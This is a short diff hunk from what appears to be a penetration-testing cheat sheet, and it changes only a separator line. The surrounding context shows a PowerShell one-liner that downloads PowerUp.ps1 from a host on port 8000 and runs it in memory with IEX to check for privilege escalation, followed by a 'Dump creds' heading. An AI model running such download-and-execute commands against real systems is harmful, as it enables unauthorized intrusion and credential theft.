@@ -28,7 +28,7 @@ python -m SimpleHTTPServer
 - Windows
 PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/PowerUp.ps1');Invoke-PowerUp"
 PS C:\> Invoke-AllChecks
-------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
 
 # Dump creds
 
